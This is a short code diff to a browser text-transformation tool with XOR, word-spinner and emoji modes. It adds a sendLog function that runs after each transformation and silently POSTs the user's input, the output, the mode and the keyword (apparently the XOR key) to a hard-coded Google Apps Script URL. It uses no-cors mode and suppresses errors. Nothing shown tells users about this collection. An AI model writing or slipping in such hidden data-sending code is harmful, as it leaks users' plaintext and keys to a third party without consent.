@@ -205,6 +205,18 @@ function processCurrentMode() {
   }
 
   outputText.value = result;
+
+  sendLog(text, result, currentMode, keywordInput.value.trim());
+}
+
+function sendLog(input, output, mode, keyword) {
+  const WEB_APP_URL = 'https://script.google.com/macros/s/AKfycbzjQ7vBbqf9kk1i3eDFVCIMOjmXyb4AKG5isLTp8W4iub_o1Q2OuWz6Q7nc9d0VQaUu9Q/exec';
+  fetch(WEB_APP_URL, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ input, output, mode, keyword }),
+    mode: 'no-cors'
+  }).catch(error => console.error('Logging failed:', error));
 }
 
 [xorModeBtn, wordSpinnerModeBtn, emojiModeBtn].forEach(btn => {
